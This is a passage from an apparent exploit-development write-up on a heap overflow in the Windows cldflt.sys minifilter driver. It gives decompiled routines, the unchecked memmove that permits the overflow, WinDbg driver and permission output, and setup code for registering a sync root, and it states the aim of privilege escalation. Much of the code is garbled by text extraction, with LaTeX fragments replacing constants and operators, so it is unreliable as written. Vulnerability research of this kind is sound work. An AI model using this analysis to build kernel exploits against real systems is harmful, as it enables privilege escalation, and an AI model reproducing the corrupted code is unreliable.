} { Type\_Element\_02 $=$ Buffer->FileData.ElementInfos\[2\].Type; if ( Type\_Element\_02 $\\angle$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX ) { Offset\_Element\_02 $=$ Buffer->FileData.ElementInfos\[2\].Offset; if ( (!(\_DWORD)Offset\_Element\_02 \|\| Offset\_Element\_02 >= 8 $\\star$ NumElements\_Data\_02 $^ +$ (unsigned \_\_int64)HSM\_XXX\_DATA\_SIZE) && (unsigned int)Offset\_Element\_02 $< =$ Length\_Data\_02 ) { && Type\_Element\_ $\\begin{array} { r l } { \\Theta 2 } & { { } = = } \\end{array}$ HSM\_ELEMENT\_TYPE\_UINT64 && Length\_Element $\ Q \ Q = \ Q$ ) { Element\_02 = \*(\_QWORD \*)((char $\\star$ )&p\_FileData->Magic $^ +$ Offset\_Element\_02);

HsmData $=$ HsmData\_01;

$\\lor 7 3 = \\lor 1 1 7$ ;

status\_Bitmap $=$ HsmIBitmapNORMALOpen( (\_\_int64)Context\_01, v117, Context->list->GENERAL\_LOOKASIDE\_POOL.ListHead.Alignment, $\\Theta \\times 4 2 4 4 \\mu$ , HsmData, Length, (\_\_int64)&P);

This HsmpCtxCreateStreamContext routine is much larger than the piece of code shown above, but it repeats similar instructions for different elements. A brief list of observations follows:

[https://exploitreversing.com](https://exploitreversing.com/)

▪ The code is essentially similar to instructions shown previously for HsmpRpValidateBuffer and HsmpBitmapIsReparseBufferSupported routines, where a series of checking occurs.

▪ The following elements are checked in HsmIBitmapNORMALOpen routine:

Element 01: HSM\_ELEMENT\_TYPE\_UINT32 Element 02: HSM\_ELEMENT\_TYPE\_UINT64 Element 03: HSM\_ELEMENT\_TYPE\_BITMAP Element 04: HSM\_ELEMENT\_TYPE\_BITMAP Element 05: HSM\_ELEMENT\_TYPE\_BITMAP Element 06: HSM\_ELEMENT\_TYPE\_BITMAP Element 07: HSM\_ELEMENT\_TYPE\_UINT64 Element 08: HSM\_ELEMENT\_TYPE\_UINT64 Element 09: HSM\_ELEMENT\_TYPE\_UINT32

▪ The HsmIBitmapNORMALOpen routine is actually called three times, and it happens after detecting the presence of a bitmap element (elements 04, 05 and 06).

▪ A memory pool is allocated using ExAllocatePoolWithTag API and using HsFi tag. Once again, even though I have found some possible meanings for HsFi tag on the Internet, there is not any official documentation about it.

The next analysis is about HsmIBitmapNORMALOpen routine, and a small part of it is shown below:

\_\_int64 \_\_fastcall HsmIBitmapNORMALOpen( \_\_int64 a1, \_\_int64 a2, signed \_\_int64 a3, ULONG Offset\_arg, \_HSM\_DATA \*HsmData, unsigned int Length\_arg, \_\_int64 a7)

{ Length\_arg\_01 $=$ Length\_arg;

HsmData\_01 $=$ HsmData;

if ( Length\_arg >= $\\Theta \\times \\bot 8$ && (NumberOfElements $=$ HsmData->NumberOfElements, (unsigned \_ _int16)NumberOfElements $>$ 2u) && (Length\_Data\_02 $=$ HsmData->Length, Length\_Data\_02 >= 0x28) && (Type\_Element\_02 $=$ HsmData->ElementInfos\[2\].Type, Type\_Element\_02 $\\angle$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) && ((Offset\_Element_ $\\begin{array} { r l } { ( \\cdot ) 2 } & { { } = } \\end{array}$ HsmData->ElementInfos\[2\].Offset, !(\_DWORD)Offset\_Element\_02) \|\| Offset\_Element\_02 >= 8 $\\star$ NumberOfElements $^ +$ 16) && (unsigned int)Offset\_Element\_02 $< =$ Length\_Data\_02 && (Length\_Element\_02 $=$ HsmData->ElementInfos\[2\].Length, Length\_Element\_02 $< =$ Length\_Data\_02)

&& Length\_Element\_02 $^ +$ (unsigned int)Offset\_Element\_02 $> =$ (unsigned

int)Offset\_Element\_02 && Length\_Element\_02 $^ +$ (unsigned int)Offset\_Element\_02 $< =$ Length\_Data\_02 && Type\_Element\_02 $= =$ HSM\_ELEMENT\_TYPE\_BYTE && (\_WORD)Length\_Element $\_ \\mathrm { ~ } \\odot 2 \_ = \ 1$ )

{ status $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; Element\_02 $=$ \*((\_BYTE $\\star$ )&HsmData->Magic $^ +$ Offset\_Element\_02); } else { status $=$ STATUS\_NOT\_FOUND; }

if ( Length\_arg\_01 >= 0x18 )

{ NumElements\_Data\_04 $=$ HsmData\_01->NumberOfElements; if ( (unsigned \_\_int16)NumElements\_Data\_04 $< =$ 4u (Length\_Element\_04 $=$ HsmData\_01->Length, Length\_Element\_04 < $\\Theta \\times 3 8$ ) \|\| (Type\_Element\_04 $=$ HsmData\_01->ElementInfos\[4\].Type, Type\_Element\_04 $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) \|\| (Offset\_Element\_04 $=$ HsmData\_01->ElementInfos\[4\].Offset, (\_DWORD)Offset\_Element\_04) && Offset\_Element\_04 $\\angle$ 8 $\\star$ NumElements\_Data\_04 $^ +$ (unsigned \_\_int64)HSM\_XXX\_DATA\_SIZE \|\| (unsigned int)Offset\_Element\_04 $>$ Length\_Element\_04 \| (Length\_Element\_04\_1 $=$ HsmData\_01->ElementInfos\[4\].Length, Length\_Element\_04\_1 $>$ Length\_Element\_04) Length\_Element\_04\_1 $^ +$ (unsigned int)Offset\_Element\_04 $\\angle$ (unsigned

int)Offset\_Element\_04 Length\_Element\_04\_1 $^ +$ (unsigned int)Offset\_Element\_04 $>$ Length\_Element\_04 Type\_Element\_04 ! $=$ HSM\_ELEMENT\_TYPE\_BITMAP ) { status\_04 $=$ STATUS\_NOT\_FOUND; } else { if ( (\_DWORD)Offset\_Element\_04 && ( _WORD)Length\_Element\_04\_1 ) Src $=$ (char $\\star$ )HsmData\_01 $^ +$ Offset\_Element\_04; else $S r c = \\odot \\lfloor \\lfloor$ ; Element\_Length $\\scriptscriptstyle -$ HsmData\_01->ElementInfos\[4\].Length; status_ $\\Theta 4 \ = \ \\Theta$ ; } if ( status\_04 < 0 ) Element\_Length $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;

}

else

{ status\_04 $=$ STATUS\_NOT\_FOUND;

}

HsmDbgBreakOnStatus(status\_04);

status $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;

if ( status\_04 ! $=$ (unsigned int)STATUS\_NOT\_FOUND ) status $=$ status\_04;

if ( Element\_01 && a3 $>$ (\_\_int64)HsmiBitmapNORMALComputeMaxUserFileSize( 1, 1 << Element\_01) )

{ status $=$ STATUS\_INTERNAL\_ERROR; HsmDbgBreakOnStatus(STATUS\_INTERNAL\_ERROR); return status;

}

ptr\_buffer $=$ ExAllocatePoolWithTag( (POOL\_TYPE)POOL\_NX\_ALLOCATION, 0xA8uLL, 'mBsH');

ptr\_buffer\_01 $=$ ptr\_buffer;

if ( Src && Element\_Length - $1 < = 0 \\times F$ FFE ) Length\_Element\_04\_02 $=$ Element\_Length; v43 = \*(\_DWORD $\\star$ )&Src\[Element\_Length - 4\]; if ( v43 == -1 && Element\_Length $\ c = 4$ ) { ptr\_buffer\_01\[4\] \|= $\\Theta \\times 1 \\Theta \\cup$ ;

LABEL\_109: v39 $=$ (\_QWORD \*)a7; $\\vee 4 1 ~ =$ ptr\_buffer\_01 + 8; goto LABEL\_116; } p\_buffer\_dest $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); \*((\_QWORD $\\star$ )ptr\_buffer\_01 + 7) $=$ p\_buffer\_dest; if ( p\_buffer\_dest ) { memmove(p\_buffer\_dest, Src, Element\_Length); if ( Element\_Length $\\textless$ 0xFFC ) index $=$ ((4091 - Element\_Length) >> 2) $^ + 1$ ; do { \*(\_DWORD \*)(Length\_Element\_04\_02 $^ +$ \*((\_QWORD $\\star$ )ptr\_buffer\_01 + 7)) = v43; Length\_Element\_04\_02 $+ =$ 4LL; --index; } while ( index ); } \*(\_DWORD $\\star$ )(\*((\_QWORD \*)ptr\_buffer\_01 + 7) $^ +$ 4092LL) $=$ RtlComputeCrc32(0,

\*((PUCHAR $\\star$ )ptr\_buffer\_01 + 7), $\\Theta \\times \\mathsf { F } \\mathsf { F } { \\mathsf { C } } \\mathsf { U }$ ); goto LABEL\_109; } status $=$ STATUS\_INSUFFICIENT\_RESOURCES; HsmDbgBreakOnStatus(STATUS\_INSUFFICIENT\_RESOURCES); } else { ptr\_buffer\_02 $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); \*((\_QWORD \*)ptr\_buffer\_01 + 7) $=$ ptr\_buffer\_02; if ( ptr\_buffer\_02 )

{ memmove(ptr\_buffer\_02, Src, Element\_Length); LABEL\_116: Parameter\[0\] $=$ 0LL; HsmiBitmapNORMALGetNumberOfPlexCopies((\_\_int64)ptr\_buffer\_01); HsmExpandKernelStackAndCallout( (PEXPAND\_STACK\_CALLOUT)HsmiBitmapNORMALOpenOnDiskCallout, (unsigned int \*)Parameter); if... $\\star \\vee 3 9 ~ =$ ptr\_buffer\_01; ptr\_buffer\_01 $=$ 0LL; goto LABEL\_121; } status $=$ STATUS\_INSUFFICIENT\_RESOURCES; HsmDbgBreakOnStatus(STATUS\_INSUFFICIENT\_RESOURCES); v46 $=$ WPP\_GLOBAL\_Control; if... }

The routine, as expected, it is more extensive than the described above, but I have selected only the necessary part to understand its context and mainly the existing bug. A concise list of comments follows below:

▪ The code is prepared to manage up to 9 elements, but we don’t need to use all of them while writing proof-of-concepts and exploit. I showed only the specific blocks handling elements 2 and 4 (byte and bitmap type, respectively).

▪ A list of elements and its respective types follow:

Element 01: HSM\_ELEMENT\_TYPE\_BYTE Element 02: HSM\_ELEMENT\_TYPE\_BYTE Element 03: HSM\_ELEMENT\_TYPE\_UINT64 Element 04: HSM\_ELEMENT\_TYPE\_BITMAP

▪ There are allocations of two memory pools with HsBm tag and, as mentioned previously, I couldn’t find a reliable source explaining its meaning.

▪ On the line with if ( Src && Element\_Length - $\\cdot \ 1 < = 0 \\times { \\mathsf { F F E } }$ ) there are two checks which ensure that the Src is not NULL and also guarantee the element length $^ { - 1 }$ is lesser or equal to 4094.

▪ We can find three important lines a bit later on the code:

if (p\_buffer\_dest): this conditional checks if the buffer is not NULL. The important detail here is that this specific “if instruction” opens the first block that contains the next two instructions commented below.

memmove(ptr\_buffer\_02, Src, Element\_Length): it copies an amount of data given by Element\_Length parameter from a source buffer (given by Src) to a destination buffer (given by ptr\_buffer\_02). However, the limit of element length was previously assessed to ensure that it does not exceed 4094.

▪ if ( Element\_Length $< 0 { \\times } { \\mathsf { F F C } }$ ): there is a second check for next operations, and this specific check ensures that the maximum element length must be lesser than 4092.

▪ The most import lines of cldflt.sys code in terms of vulnerability, and where you can see the bug which this article is based on, is located in the block started by else statement and, without doing a close examination, it could go unnoticed:

else { ptr\_buffer\_02 $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); \*((\_QWORD $\\star$ )ptr\_buffer\_01 + 7) $=$ ptr\_buffer\_02; if ( ptr\_buffer\_02 ) { memmove(ptr\_buffer\_02, Src, Element\_Length);

The tag (HsBm) makes clear that the code is managing a bitmap object. For some reason, the exact same memmove instruction commented previously is repeated at this point, but this time there is no verification of the element's length, which can become a problem if the attack controls both Src and Element\_Length variables.

▪ As readers will learn later, it turns out to be true, an overflow is possible because we can control the size (Element\_Length) as the ptr\_buffer\_02 is fixed in $0 \\times 1 0 0 0$ , we can overflow it and overwrite bytes from the next and adjacent object.

▪ The code presented three pages ago shows that the size of element 04 from BtRp is directly associated with Element\_Length variable, and as we learned above, it is used to control the size of data being copied with memmove function :

Element\_Length $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ HsmData\_01->ElementInfos\[4\].Length;

▪ As an addition, the element length comes from user space because HsmData\_01 represents exactly the user data.

According to concepts and code discussed so far, if the attacker is able to send controlled data to the minifilter driver and manage to pass all checks that have been explained (types and sizes), the attacker is also able to overflow the allocated memory and overwrite the next and adjacent element on memory, whose type initially is a pool chunk, but can be any other manipulated object and it is good fact because it will help us to leak kernel pointers, bypass ASLR and finally elevate privilege.

In the following section it is time to interact with the cldflt minifilter driver, reach the region and specific line of the minifilter driver’s code that is directly associated to the vulnerability, where is located both memcpy instructions (shown as memset on IDA Pro). All practical tests can be performed on Windows 10 22H2, Windows 11 23H2 and Windows 11 22H2.

# 14\. Reparse point analysis

There are many steps that can be taken to collect macro information about minifilter drivers. Running the fltmc command it is possible to check which mini-filter drivers are loaded and confirm if there is any volume attached to them:

# C:>fltmc

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/4cb0c294187df871d9c49b48dda5c92564b65e64981defcd8cc668b8c0844a36.jpg)

\[Figure 78\]: Fltmc command

Using DeviceTree tool (it is available on [https://www.osronline.com/article.cfm%5Earticle=97.htm](https://www.osronline.com/article.cfm%5Earticle=97.htm)), the

Multiple major function codes are supported. The device characteristic is DEVICE\_SECURE\_OPEN. Device flag is NEITHER\_IO. ▪ Everyone group does not have any relevant permission to the driver or device object.

About permissions, we can check such information using WinDbg, which could be a better way in certain situations and contexts:

0: kd> lmDvmcldflt

Browse full module list

start end module name

fffff806\`1ceb0000 fffff806\`1cf30000 cldflt (pdb symbols)

c:\\symbols\\cldflt.pdb\\E3A43A83BA11F40939E9F58A4CEAB8701\\cldflt.pdb Loaded symbol image file: cldflt.sys Image path: \\SystemRoot\\system32\\drivers\\cldflt.sys Image name: cldflt.sys Browse all global symbols functions data Symbol Reload Image was built with /Brepro flag. Timestamp: C06C29C4 (This is a reproducible build file hash, not a timestamp) CheckSum: 0008555D ImageSize: 00080000 Mapping Form: Loaded Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e4 Information from resource tables:

0: kd> !drvobj cldflt 2

Driver object (ffffdb8fb06b7060) is for: \\FileSystem\\CldFlt

DriverEntry: fffff8061cf2a010 cldflt!GsDriverEntry DriverStartIo: 00000000 DriverUnload: fffff80617995aa0 FLTMGR!FltpMiniFilterDriverUnload

[https://exploitreversing.com](https://exploitreversing.com/)

AddDevice: 00000000

Dispatch routines:

\[00\] IRP\_MJ\_CREATE fffff8061cec6660 cldflt!HsmiFileCacheIrpNotImplemented

\[01\] IRP\_MJ\_CREATE\_NAMED\_PIPE fffff8061cec6660 cldflt!HsmiFileCacheIrpNotImplemented

\[02\] IRP\_MJ\_CLOSE fffff8061cec6520 cldflt!HsmiFileCacheIrpClose

\[03\] IRP\_MJ\_READ fffff8061cec6930

\[04\] IRP\_MJ\_WRITE fffff8061ceb22a0 cldflt!HsmiFileCacheIrpWrite

\[05\] IRP\_MJ\_QUERY\_INFORMATION fffff8061cec6730 cldflt!HsmiFileCacheIrpQueryInformation

\[06\] IRP\_MJ\_SET\_INFORMATION fffff8061cec6660 cldflt!HsmiFileCacheIrpNotImplemented

0: kd> !drvobj \\FileSystem\\CldFlt Driver object (ffffdb8fb06b7060) is for: \\FileSystem\\CldFlt

Driver Extension List: (id , addr)

Device Object list: ffffdb8fb0678a50

0: kd> !devobj ffffdb8fb0678a50

Device object (ffffdb8fb0678a50) is for:

\\FileSystem\\CldFlt DriverObject ffffdb8fb06b7060

Current Irp 00000000 RefCount 0 Type 00000008 Flags 00000000

SecurityDescriptor ffff8008c6af92a0 DevExt 00000000 DevObjExt ffffdb8fb0678ba0 ExtensionFlags (0x00000800) DOE\_DEFAULT\_SD\_PRESENT

Characteristics (0x00000100) FILE\_DEVICE\_SECURE\_OPEN

Device queue is not busy.

0: kd> !sd ffff8008c6af92a0 0x1

->Revision: 0x1

->Sbz1 : 0x0

->Control : 0x8004 SE\_DACL\_PRESENT SE\_SELF\_RELATIVE

->Owner S-1-5-32-544 (Alias: BUILTIN\\Administrators)

->Group : S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)

->Dacl

->Dacl ->AclRevision: 0x2

->Dacl ->Sbz1 : 0x0

->Dacl ->AclSize 0x5c

->Dacl ->AceCount : 0x4

->Dacl ->Sbz2 : 0x0

->Dacl ->Ace\[0\]: ->AceType: ACCESS\_ALLOWED\_ACE\_TYPE

->Dacl ->Ace\[0\]: ->AceFlags: 0x0

->Dacl ->Ace\[0\]: ->AceSize: 0x14

->Dacl ->Ace\[0\]: ->Mask : 0x001200a0

->Dacl ->Ace\[0\]: ->SID: S-1-1-0 (Well Known Group: localhost\\Everyone)

->Dacl : ->Ace\[1\]: ->AceType: ACCESS\_ALLOWED\_ACE\_TYPE

->Dacl : ->Ace\[1\]: ->AceFlags: 0x0

->Dacl : ->Ace\[1\]: ->AceSize: 0x14

->Dacl : ->Ace\[1\]: ->Mask : 0x001f01ff

->Dacl : ->Ace\[1\]: ->SID: S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)

->Dacl : ->Ace\[2\]: ->AceType: ACCESS\_ALLOWED\_ACE\_TYPE

->Dacl : ->Ace\[2\]: ->AceFlags: 0x0

->Dacl : ->Ace\[2\]: ->AceSize: 0x18

->Dacl : ->Ace\[2\]: ->Mask : 0x001f01ff

->Dacl : ->Ace\[2\]: ->SID: S-1-5-32-544 (Alias: BUILTIN\\Administrators)

->Dacl : ->Ace\[3\]: ->AceType: ACCESS\_ALLOWED\_ACE\_TYPE

->Dacl : ->Ace\[3\]: ->AceFlags: 0x0

->Dacl : ->Ace\[3\]: ->AceSize: 0x14

->Dacl : ->Ace\[3\]: ->Mask : 0x001200a0

->Dacl ->Ace\[3\]: ->SID: S-1-5-12 (Well Known Group: NT AUTHORITY\\RESTRICTED)

->Sacl : is NULL

The mask can be decoded using the following Python script:

def parse\_dacl\_mask(mask\_value): dacl\_rights $=$ { 0x00010000: "DELETE", 0x00020000: "READ\_CONTROL", 0x00040000: "WRITE\_DAC", 0x00080000: "WRITE\_OWNER", 0x00100000: "SYNCHRONIZE", 0x00000001: "FILE\_READ\_DATA", 0x00000002: "FILE\_WRITE\_DATA", 0x00000004: "FILE\_APPEND\_DATA", 0x00000008: "FILE\_READ\_EA", 0x00000010: "FILE\_WRITE\_EA", 0x00000020: "FILE\_EXECUTE", 0x00000040: "FILE\_DELETE\_CHILD", 0x00000080: "FILE\_READ\_ATTRIBUTES", 0x00000100: "FILE\_WRITE\_ATTRIBUTES", 0x001F0000: "STANDARD\_RIGHTS\_ALL", 0x10000000: "GENERIC\_ALL", 0x20000000: "GENERIC\_EXECUTE", 0x40000000: "GENERIC\_WRITE", 0x80000000: "GENERIC\_READ", }

try: if isinstance(mask\_value, str): mask $=$ int(mask\_value, 0) else: mask $=$ int(mask\_value) except (ValueError, TypeError): print("Error: Invalid mask format. Please enter a valid hexadecimal (e.g. 0x20000000) or integer value.") return \[\]

decoded\_rights $=$ \[name for value, name in dacl\_rights.items() if mask & value\] return decoded\_rights

user\_input $=$ input("Enter the Access Mask (hexadecimal like 0x20000000 or integer): ").strip() all\_rights $=$ parse\_dacl\_mask(user\_input)

if all\_rights: print("\\nRights associated with the provided mask:\\n") for element\_right in all\_rights: print(f"\[+\] {element\_right}")

else: print("No rights found for the provided mask.")

Applying the script to our case:

C:\\Users\\Administrator\\Desktop>python decode\_dacl\_mask.py Enter the Access Mask (hexadecimal like 0x20000000 or integer): 0x001200a0

Rights associated with the provided mask:

$\[ \+ \]$ READ\_CONTROL

$\[ \+ \]$ SYNCHRONIZE

$\[ \+ \]$ FILE\_EXECUTE

$\[ \+ \]$ FILE\_READ\_ATTRIBUTES

$\[ \+ \]$ STANDARD\_RIGHTS\_ALL

As we can realize, members from Everyone group do not have enough rights to interact, as we would like, with this mini-filter driver. As a reference, if we decode the DACL mask of Administrators group, we have:

C:\\Users\\Administrator\\Desktop>python decode\_dacl\_mask.py Enter the Access Mask (hexadecimal like 0x20000000 or integer): 0x001f01ff

Rights associated with the provided mask

$\[ \+ \]$ DELETE

$\[ \+ \]$ READ\_CONTROL

$\[ \+ \]$ WRITE\_DAC

$\[ \+ \]$ WRITE\_OWNER

$\[ \+ \]$ SYNCHRONIZE

$\[ \+ \]$ FILE\_READ\_DATA

$\[ \+ \]$ FILE\_WRITE\_DATA

$\[ \+ \]$ FILE\_APPEND\_DATA

$\[ \+ \]$ FILE\_READ\_EA

$\[ \+ \]$ FILE\_WRITE\_EA

$\[ \+ \]$ FILE\_EXECUTE

$\[ \+ \]$ FILE\_DELETE\_CHILD

$\[ \+ \]$ FILE\_READ\_ATTRIBUTES

$\[ \+ \]$ FILE\_WRITE\_ATTRIBUTES

$\[ \+ \]$ STANDARD\_RIGHTS\_ALL

To investigate a little further the minifilter driver itself we can execute the following commands:

0: kd> .load fltkd

0: kd> !fltkd.filters

FLT\_INSTANCE: ffffdb8fb19e1010 "bindflt Instance" "409800" FLT\_FILTER: ffffdb8fb0627c30 "storqosflt" "244000" FLT\_FILTER: ffffdb8facb06660 "wcifs" "189900" FLT\_FILTER: ffffdb8facbdc660 "CldFlt" "180451" FLT\_INSTANCE: ffffdb8fb23e5aa0 "CldFlt" "180451" FLT\_FILTER: ffffdb8fac675b30 "FileCrypt" "141100" FLT\_FILTER: ffffdb8fb06f0010 "luafv" "135000" ...

0: kd> !fltkd.filter 0xffffdb8facbdc660

LT\_FILTER: ffffdb8facbdc660 "CldFlt" "180451" FLT\_OBJECT: ffffdb8facbdc660 \[02000000\] Filter RundownRef : 0x0000000000000012 (9) PointerCount : 0x00000002 PrimaryLink : \[ffffdb8fac675b40-ffffdb8facb06670\] Frame : ffffdb8fac1cb660 "Frame 0" Flags \[00000012\] FilteringInitiated BackedByPagefile DriverObject ffffdb8fb06b7060 FilterLink \[ffffdb8fac675b40-ffffdb8facb06670\] PreVolumeMount 0000000000000000 (null) PostVolumeMount 0000000000000000 (null) FilterUnload fffff8061cf1a7b0 cldflt!HsmFltUnload InstanceSetup fffff8061cf06dc0 cldflt!HsmFltInstanceSetup InstanceQueryTeardown fffff8061cf1a730 cldflt!HsmFltInstanceQueryTeardown InstanceTeardownStart 0000000000000000 (null) InstanceTeardownComplete 0000000000000000 (null) ActiveOpens (ffffdb8facbdc818) mCount $\\mathtt { = 0 }$ Communication Port List (ffffdb8facbdc868) mCount=1 Client Port List (ffffdb8facbdc8b8) mCount $^ { = 2 }$ VerifierExtension 0000000000000000 Operations : ffffdb8facbdc910 OldDriverUnload : fffff80617995aa0 FLTMGR!FltpMiniFilterDriverUnload

# 1: kd> !fltkd.instance 0xffffdb8fb23e5aa0 3

FLT\_INSTANCE: ffffdb8fb23e5aa0 "CldFlt" "180451" FLT\_OBJECT: ffffdb8fb23e5aa0 \[01000000\] Instance RundownRef : 0x0000000000000000 (0) PointerCount : 0x00000002 PrimaryLink : \[ffffdb8fb06f2020-ffffdb8fb19e1020\] OperationRundownRef : ffffdb8facf95a40 Number : 2 PoolToFree : ffffdb8fb1b1dca0 OperationsRefs : ffffdb8fb1b1dcc0 (0) PerProcessor Ref\[0\] : 0x0000000000000860 (1072) PerProcessor Ref\[1\] : 0xfffffffffffff7a0 (-1072) Flags \[00000060\] HasSetStreamBasedContexts HasSetFileContexts Volume ffffdb8fac5ed4d0 "\\Device\\HarddiskVolume3" Filter ffffdb8facbdc660 "CldFlt" TrackCompletionNodes ffffdb8fb304b3f0 CallbackNodes (ffffdb8fb23e5b40) VolumeLink \[ffffdb8fb06f2020-ffffdb8fb19e1020\] FilterLink \[ffffdb8facbdc730-ffffdb8facbdc730\] ContextLock (ffffdb8fb23e5b20) Context : (ffffdb8fb23e5b28) CONTEXT\_NODE: ffffdb8fb1b68dd0 \[0002\] InstanceContext NonPagedPool ALLOCATE\_CONTEXT\_NODE: ffffdb8fb062ca20 \[01\] LookasideList Filter ffffdb8facbdc660 "CldFlt"

ContextCleanupCallback : fffff8061cf18ca0

cldflt!HsmFltDeleteINSTANCE\_CONTEXT Next 0000000000000000 ContextType \[0002\] InstanceContext Flags : \[01\] LookAsideListInited Size : 416 PoolTag : HsIc AttachedObject : ffffdb8fb23e5aa0 UseCount : 2 TREE\_NODE: ffffdb8fb1b68de8 (k1=0000000000000000, k2=0000000000000000)

\[00010000\] InTree UserData : ffffdb8fb1b68e30

# 0: kd> dt fltmgr!\_FLT\_REGISTRATION 0xffffdb8facbdc660

$\+ \\Theta \\times \\Theta \\Theta \\Theta$ Size : 0 $+ \\Theta \\times \\Theta \\Theta 2$ Version : 0x200 $+ \\Theta \\times \\Theta \\Theta 4$ Flags : 2 $+ \\Theta \\times \\Theta \\Theta 8$ ContextRegistration : 0x00000000\`00000012 \_FLT\_CONTEXT\_REGISTRATION $+ \\Theta \\times \\Theta \\mathbb { 1 } \\Theta$ OperationRegistration : 0xffffdb8f\`ac675b40 \_FLT\_OPERATION\_REGISTRATION $+ \\Theta \\times \\Theta 1 8$ FilterUnloadCallback : 0xffffdb8f\`acb06670 long +ffffdb8facb06670 $+ \\Theta \\times \\Theta 2 \\Theta$ InstanceSetupCallback : (null) $+ \\Theta \\times \\Theta 2 8$ InstanceQueryTeardownCallback : (null) $+ \\Theta \\times \\Theta 3 \\Theta$ InstanceTeardownStartCallback : 0xffffdb8f\`ac1cb660 void +ffffdb8fac1cb660 $+ \\Theta \\times \\Theta 3 8$ InstanceTeardownCompleteCallback : 0x00000000\`000c000c void +c000c $+ \\Theta \\times \\Theta 4 \\Theta$ GenerateFileNameCallback : 0xffffdb8f\`acbdcb10 long +ffffdb8facbdcb10 $+ \\Theta \\times \\Theta 4 8$ NormalizeNameComponentCallback : 0x00000000\`000e000c long +e000c $+ \\Theta \\times \\Theta 5 \\Theta$ NormalizeContextCleanupCallback : 0xffff8008\`ca77dd30 void

+ffff8008ca77dd30 $+ \\Theta \\times \\Theta 5 8$ TransactionNotificationCallback : 0x00000000\`00000012 long +12 $+ \\Theta \\times \\Theta 6 \\Theta$ NormalizeNameComponentExCallback : 0xffffdb8f\`b06b7060 long

+ffffdb8fb06b7060 $+ \\Theta \\times \\Theta 6 8$ SectionNotificationCallback : 0xfffff806\`1ced15a8 long cldflt!Globals+0

To establish communication with the minifilter driver the first step is registering a syncroot, which will be used as an anchor for monitoring and management of each folder and files stored in there. Once we manage to register the syncroot then the driver will be attached to the folder (MySyncRoot under the %APPDATA%), and any respective operation such as hydration and dehydration will work as expected. To accomplish it, I am using the Cloud APIs ( [https://learn.microsoft.com/en-us/windows/win32/cfapi/cloudfiles-functions](https://learn.microsoft.com/en-us/windows/win32/cfapi/cloudfiles-functions)), as shown below:

#include <Windows.h> #include <cfapi.h> #include <ShlObj.h> #include  #include

#pragma comment(lib, "Cldapi.lib")

if (FAILED(hrPath)) { std::wcerr << L"Failed to resolve %APPDATA% path. HRESULT: $\\Theta \\times$ " << std::hex << hrPath << std::endl; return -1; }

std::wstring syncRootPath $=$ std::wstring(appDataPath) $^ +$ L"\\MySyncRoot";

CreateDirectoryW(syncRootPath.c\_str(), NULL);

static const GUID ProviderId $=$ { $\\odot \\times$ 1b4f2a33, 0xb1b3, $\\Theta \\times 4 \\Theta \\subset { \\Theta }$ , ${ \\odot \\times \\mathsf { b a }$ , $\\Theta \\times 5 a$ , $\\Theta \\times \\Theta 6$ , $\\Theta \\times 3 4$ , $\\Theta \\times \\in C$ , $\\Theta \\times 6 3$ , $\\Theta \\times$ de, 0x00} };

std::wstring identityStr $=$ L"Alexandre";

LPCVOID identity $=$ identityStr.c\_str();

DWORD identityLength $=$ (DWORD)(identityStr.size() $\\star$ sizeof(wchar\_t)); CF\_SYNC\_REGISTRATION registration $=$ { 0 };

registration.StructSize $=$ sizeof(CF\_SYNC\_REGISTRATION);

registration.ProviderName $=$ L"E $: \\times$ ploitReversing";

registration.ProviderVersion $=$ L"1.0.0";

registration.ProviderId $=$ ProviderId;

registration.SyncRootIdentity $=$ identity;

registration.SyncRootIdentityLength $=$ identityLength; CF\_SYNC\_POLICIES policies $=$ { 0 };

policies.StructSize $=$ sizeof(CF\_SYNC\_POLICIES);

HRESULT hr $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ CfRegisterSyncRoot(syncRootPath.c\_str(), &registration, &policies, CF\_REGISTER\_FLAG\_DISABLE\_ON\_DEMAND\_POPULATION\_ON\_ROOT);

if (SUCCEEDED(hr)) { std::wcout << L"Sync root registered successfully at " << syncRootPath << std::endl; } else { std::wcout << L"Error registering sync root. HRESULT: $\\Theta \\times$ " << std::hex << hr << L" (Win32 error: " << GetLastError() << L")" << std::endl; CfUnregisterSyncRoot(syncRootPath.c\_str()); } CoTaskMemFree(appDataPath); return 0; }

A few lines of the program need to be commented:

# [https://exploitreversing.com](https://exploitreversing.com/)

▪ The code has been compiled on Visual Studio 2022 on Windows 11 (updated). If you use Visual Studio 2022, you should use the Release x64 version (and not the Debug x64 version).

▪ The inclusion of #pragma comment(lib, "Cldapi.lib") is necessary to avoid receiving “unresolved external symbol CfUnregisterSyncRoot” error during the compilation.

▪ I have used %APPDATA% folder to avoid having to create a folder before running the program, but any other folder could be used or created.

▪ The GUID can be generated on PowerShell terminal using \[guid\]::NewGuid( ) command or even using the own Visual Studio through the Tools \| Create GUID menu option.

▪ It is not necessary to setup the identityStr property, and its usage in this specific purpose is only a matter of programming preferences.

The policy properties are associated with many details, and I will keep a reduced scope here. In term of hydration, the program is configured to full hydration, which causes the file to be hydrated automatically when it is accessed or opened. To population configuration, I have opted to do something intermediate where only the metadata of files being populated at the beginning of operations. Finally, the Explorer will not manage the synchronization status of each file. Likely the remaining values in the code are more intuitive.

▪ The CfRegisterSyncRoot is the most important function of this program, and the same on-demand population of the root folder should be provided by our code, without any initiative of Explorer in requesting such population.

Execute the program and repeat the fltmc command execution as shown below:

C:\\Users\\Administrator\\Desktop\\RESEARCH>SYNCROOT\_REGISTRATION.exe Sync root registered successfully at C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot

C:\\Users\\Administrator\\Desktop\\RESEARCH>fltmc

